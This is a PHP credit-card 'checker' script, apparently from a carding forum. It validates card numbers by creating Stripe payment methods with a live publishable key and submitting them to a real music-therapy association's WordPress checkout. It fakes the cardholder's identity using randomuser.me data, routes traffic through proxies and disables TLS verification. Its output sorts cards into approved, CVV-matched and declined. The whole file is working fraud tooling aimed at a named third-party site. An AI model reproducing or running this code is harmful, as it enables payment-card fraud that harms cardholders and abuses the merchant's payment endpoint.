<?php

    error_reporting(0);

  //BY PINKY

    function multiexplode($delimiters, $string) {
        $one = str_replace($delimiters, $delimiters[0], $string);
        $two = explode($delimiters[0], $one);
        return $two;
    }
    $lista = $_GET['lista'];
    $cc = multiexplode(array(":", "|", ""), $lista)[0];
    $mes = multiexplode(array(":", "|", ""), $lista)[1];
    $ano = multiexplode(array(":", "|", ""), $lista)[2];
    $cvv = multiexplode(array(":", "|", ""), $lista)[3];
    function getStr2($string, $start, $end) {
        $str = explode($start, $string);
        $str = explode($end, $str[1]);
        return $str[0];
  $lista = "$cc|$mes|$ano|$cvv";

    }

if($ano=="2020"){
  $ano="20";
}
else if($ano=="2021"){
  $ano="21";
}
else if($ano=="2022"){
  $ano="22";
}
else if($ano=="2023"){
  $ano="23";
}
else if($ano=="2024"){
  $ano="24";
}
else if($ano=="2025"){
  $ano="25";
}
else if($ano=="2026"){
  $ano="26";
}
else if($ano=="2027"){
  $ano="27";
}
else if($ano=="2028"){
  $ano="28";
}
else{
  $ano = "21";
}

$last = substr($cc, 12, 16);

  function getBin($cc){
    $bin = substr($cc, 0, 6);
    $searchfor = $bin;
    $contents = file_get_contents('bins.csv');
    $pattern = preg_quote($searchfor, '/');
    $pattern = "/^.*$pattern.*\$/m";
    if (preg_match_all($pattern, $contents, $matches)) {
        $encontrada = implode("\n", $matches[0]);
    }
    $pieces = explode(";", $encontrada);
    $c = count($pieces);
    if ($c == 8) {
    $pais = $pieces[4];
    $paiscode = $pieces[5];
    $banco = $pieces[2];
    $level = $pieces[3];
    $bandeira = $pieces[1];
    } else {
     $pais = $pieces[5];
     $paiscode = $pieces[6];
     $level = $pieces[4];
     $banco = $pieces[2];
     $bandeira = $pieces[1];
    }
    return ''.$bandeira.' '.$banco.' '.$level.'('.$pais.')';
  }


$bin = substr($cc, 0, 6);
$bin = getBin($bin);
  function GetStr($string, $start, $end)
{
$str = explode($start, $string);
$str = explode($end, $str[1]);
return $str[0];
}
    function dadosnome(){
        $nome = file("lista_nomes.txt");
        $mynome = rand(0, sizeof($nome)-1);
        $nome = $nome[$mynome];
        return $nome;
    }
    function dadossobre(){
        $sobrenome = file("lista_sobrenomes.txt");
        $mysobrenome = rand(0, sizeof($sobrenome)-1);
        $sobrenome = $sobrenome[$mysobrenome];
        return $sobrenome;
    }



   $nome = dadosnome();
    $sobrenome = dadossobre();
   $email = $nome.$sobrenome.mt_rand(00,99);
    $stripped = preg_replace('/\s/', '', $email);
$email1 = strtolower($stripped);



    $keys = array(
  1 => 'pk_live_BzITKuEDSL0AOSLtNPh2MbCT00IbRBDfCX'
  );
    $key = array_rand($keys);
    $keyStripe = $keys[$key];
function cyraxproxies()
{
  $poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = cyraxproxies();
$super_proxy = 'zproxy.lum-superproxy.io';
$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
        $name = $matches1[1][0];
        preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
        $last = $matches1[1][0];
        preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
        $email = $matches1[1][0];
        preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
        $street = $matches1[1][0];
        preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
        $city = $matches1[1][0];
        preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
        $state = $matches1[1][0];
        preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
        $phone = $matches1[1][0];
        preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
        $postcode = $matches1[1][0];
        preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
        $email = $matches1[1][0];

/////////// [Bin Lookup Api] /////////////

$cctwo = substr("$cc", 0, 6);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cctwo.'');
curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$fim = json_decode($fim,true);
$bank = $fim['bank']['name'];
$country = $fim['country']['alpha2'];
$type = $fim['type'];

if(strpos($fim, '"type":"credit"') !== false) {
  $type = 'Credit';
} else {
  $type = 'Debit';
}
curl_close($ch);
/////////////////////////////////////PROXIES////////////////////////////////////////////////////

////////////////////////////////////===[For Authorizing Cards]////////////////////////////////////////////////////
////////////////////////////////////////////////////////////1 req/////////////////////////////////========================================
$ch = curl_init('');
curl_setopt($ch, CURLPROXY_SOCKS5, $poxySocks4);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: api.stripe.com',
'accept: application/json',
'origin: https://js.stripe.com',
'user-agent: Mozilla/5.0 (Linux; Android 9; motorola one macro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36',
'content-type: application/x-www-form-urlencoded',
'referer: https://js.stripe.com/v3/controller-76600170d298ea4d27a4c21942f52ae6.html'
));
curl_setopt($ch, CURLOPT_POSTFIELDS,
'type=card&billing_details[address][line1]='.$street.'&billing_details[address][line2]='.$street.'&billing_details[address][city]='.$city.'&billing_details[address][country]=AG&billing_details[address][state]='.$state.'&billing_details[address][postal_code]='.$postcode.'&billing_details[name]='.$name.'+'.$last.'&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=e0d4ee99-4bf0-4d0a-8f9b-a5ac6443ad268e2957&muid=c1a882bb-ec71-4564-817c-a3e3a0cc9da847705e&sid=f90fd8d5-79e4-4ce9-83f4-3f4cf63a170b2865d5&pasted_fields=number&payment_user_agent=stripe.js%2F5db0321f4%3B+stripe-js-v3%2F5db0321f4&time_on_page=76670&referrer=https%3A%2F%2Fwww.musictherapy.org.nz%2Fregister%2Fregistered-music-therapists%2F%3Faction%3Dcheckout%26txn%3D7s&key=pk_live_51DJ920AhFY7gGvg7RqNwODORvCQIwFBhEieyfenSIIvVpUWPxyptTHCRDg51YK5EXiFts3k9t03suQkINHmCstRF00ugOAbfyX');
$result1 = curl_exec($ch);
//echo "<b>1REQ Result:</b> $result1<br><br>";
//$a = json_decode($result1, true);
//$token = $a['data']['tokenizeCreditCard']['token'];

//echo<b> Message </b> $result";
$token = trim(strip_tags(getstr($result1,'"id": "','"')));
$message1 = trim(strip_tags(getstr($result1,'"message": "','"')));
//echo "$token";

//////////////////////////////////////////////2 req  ///////////////////////////////////////////============================================

//////////////////////////////////////////////2 req  ///////////////////////////////////////////============================================

$ch = curl_init();
curl_setopt($ch, CURLPROXY_SOCKS5, $poxySocks4);
curl_setopt($ch, CURLOPT_URL, 'https://www.musictherapy.org.nz/wp-admin/admin-ajax.php');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: www.musictherapy.org.nz',
'accept: application/json, text/javascript, */*; q=0.01',
'origin: https://www.musictherapy.org.nz',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36',
'content-type: multipart/form-data; boundary=----WebKitFormBoundaryuGk4TH4UjDSpDWwZ',
'referer: https://www.musictherapy.org.nz/register/registered-music-therapist-non-practising/?action=checkout&txn=80'
));

curl_setopt($ch, CURLOPT_POSTFIELDS, '------WebKitFormBoundaryuGk4TH4UjDSpDWwZ
Content-Disposition: form-data; name="mepr_transaction_id"

288
------WebKitFormBoundaryuGk4TH4UjDSpDWwZ
Content-Disposition: form-data; name="address_required"

1
------WebKitFormBoundaryuGk4TH4UjDSpDWwZ
Content-Disposition: form-data; name="card-address-one"

'.$street.'
------WebKitFormBoundaryuGk4TH4UjDSpDWwZ
Content-Disposition: form-data; name="card-address-two"

'.$street.'
------WebKitFormBoundaryuGk4TH4UjDSpDWwZ
Content-Disposition: form-data; name="card-address-city"

'.$city.'
------WebKitFormBoundaryuGk4TH4UjDSpDWwZ
Content-Disposition: form-data; name="card-address-country"

US
------WebKitFormBoundaryuGk4TH4UjDSpDWwZ
Content-Disposition: form-data; name="card-address-state"

'.$state.'
------WebKitFormBoundaryuGk4TH4UjDSpDWwZ
Content-Disposition: form-data; name="card-address-zip"

'.$postcode.'
------WebKitFormBoundaryuGk4TH4UjDSpDWwZ
Content-Disposition: form-data; name="card-name"

'.$name.'+'.$last.'
------WebKitFormBoundaryuGk4TH4UjDSpDWwZ
Content-Disposition: form-data; name="payment_method_id"

'.$token.'
------WebKitFormBoundaryuGk4TH4UjDSpDWwZ
Content-Disposition: form-data; name="action"

mepr_stripe_confirm_payment
------WebKitFormBoundaryuGk4TH4UjDSpDWwZ
Content-Disposition: form-data; name="mepr_current_url"

https://www.musictherapy.org.nz/register/registered-music-therapist-non-practising/?action=checkout&txn=80#mepr_jump
------WebKitFormBoundaryuGk4TH4UjDSpDWwZ--
');

$result = curl_exec($ch);
$message = trim(strip_tags(getstr($result,'"message":"','"')));
$info = curl_getinfo($ch,CURLINFO_TOTAL_TIME);
$net = substr($info,0,4)."sec";



////$token = getStr($result2, '"message":"', '"');
////$code = getStr($result2, '"decline_code": "', '"');


    //////////////////////===[Card Response]

if (strpos($result, '"cvc_check": "pass"')) {
  echo '<span class="badge badge-success">#Approved_CVV</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">✓</span> <span class="badge badge-success"> ★ CVV MATCHED [Osito_OG] </span> </span> <span class="badge badge-info"> '.$bank.'  ('.$country.') </span> </br>';
}

elseif(strpos($result, "Your card's security code is incorrect." )) {
	 $bin = substr($cc, 0,6);
$binn = substr($cc, 0,6);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.cardbinlist.com/search.html?bin='.$bin);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$bin = curl_exec($ch);
$level     = trim(strip_tags(getstr($bin,'Card Sub Brand</th>','</td>')));
curl_close($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$binn);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$bin = curl_exec($ch);
curl_close($ch);
$data = date("d/m/Y H:i:s");
$pais = trim(strip_tags(getstr($bin,'country":{"alpha2":"','"')));
$banco = trim(strip_tags(getstr($bin,'"bank":{"name":"','"')));
$brand = trim(strip_tags(getstr($bin,'"scheme":"','"')));
$fone = trim(strip_tags(getstr($bin,'"phone":"','"')));
$tipo = trim(strip_tags(getstr($bin,'},"type":"','"')));
$latitude = trim(strip_tags(getstr($bin,'latitude":',',')));
$logitude = trim(strip_tags(getstr($bin,'longitude":','}}')));
$prepago = trim(strip_tags(getstr($bin,'"prepaid":',',')));
$valores = array('USD$ 1,00','USD$ 5,00','USD$ 1,40','USD$ 4,80','USD$ 2,00','USD$ 7,00','USD$ 10,00','USD$ 3,00','USD$ 3,40','USD$ 5,50');
$debitouu = $valores[mt_rand(0,9)];
  /*echo '<span class="badge badge-success">#Aprovada ? '.$lista.' | Informaci�n | BIN: '.$binn.' | PAIS: '.$pais.' | BANCO: '.$banco.' | BANDEIRA: '.$brand.' | NIVEL: '.$level.' | PR�-PAGO : '.$prepago.' | <br>PHONE : '.$fone.' | TIPO : '.$tipo.' | LATITUDE : '.$latitude.' | LONGITUDE : '.$logitude.' | DATA: '.$data.' | GATE [Osito_OG] | DEBITOU: '.$debitouu.' cc checker By [Osito_OG] </span>  </br>';*/
  echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✕</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">✕</span> <span class="badge badge-success"> ★ CC Checked [By Osito_OG] </span> </br>';
}


elseif(strpos($result, 'Your card was declined.')) {
  echo '<span class="new badge-info">#Reprovada</span> <span class="new badge-info">✕</span> <span class="new badge-info">' . $lista . '</span> <span class="new badge-info">✕</span> <span class="badge badge-info"> ★ CC Declinada [By Osito_OG] </span></br>';
}

 else {
  echo '<span class="new badge-info">#Reprovada</span> <span class="new badge-info">✕</span> <span class="new badge-info">' . $lista . '</span> <span class="new badge-info">✕</span> <span class="badge badge-info"> ★ API Muerta [By Osito_OG] </span> </br>';
}

curl_close($ch);
ob_flush();


?>
